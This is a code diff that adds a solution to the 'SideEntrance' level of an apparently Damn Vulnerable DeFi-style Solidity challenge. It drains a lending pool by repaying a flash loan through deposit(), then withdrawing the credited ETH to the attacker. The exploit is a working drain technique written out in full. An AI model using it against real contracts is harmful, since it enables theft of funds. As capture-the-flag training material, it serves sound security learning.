@@ -36,7 +36,9 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
-
+        sideEntranceLenderPool.flashLoan(address(sideEntranceLenderPool).balance);
+        sideEntranceLenderPool.withdraw();
+        payable(attacker).transfer(address(this).balance);
         /**
          * EXPLOIT END *
          */
@@ -44,8 +46,15 @@ contract SideEntrance is Test {
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
 
+    function execute() external payable {
+        sideEntranceLenderPool.deposit{value: msg.value}();
+    }
+
     function validation() internal {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
+    }
+
+    receive() external payable {
     }
 }
